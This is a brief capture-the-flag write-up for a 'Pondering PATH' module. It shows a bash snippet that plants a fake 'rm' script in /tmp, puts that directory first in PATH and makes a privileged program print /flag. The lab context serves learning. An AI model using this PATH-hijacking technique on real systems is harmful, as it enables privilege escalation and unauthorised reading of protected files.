# Pondering PATH

This is so funny. remember the stuff I did in hello hackers ? It's the same thing.

It really dosent need a writup per line - alll of them are variations on:

```bash
mkdir -p /tmp/mybin
echo '#!/bin/bash' > /tmp/mybin/rm
echo 'cat /flag' >> /tmp/mybin/rm
chmod +x /tmp/mybin/rm
export PATH="/tmp/mybin:$PATH"
```

and running the command.

where rm is the non builtin command that you wanna attack, and cat flag part to run whatever you wanna.
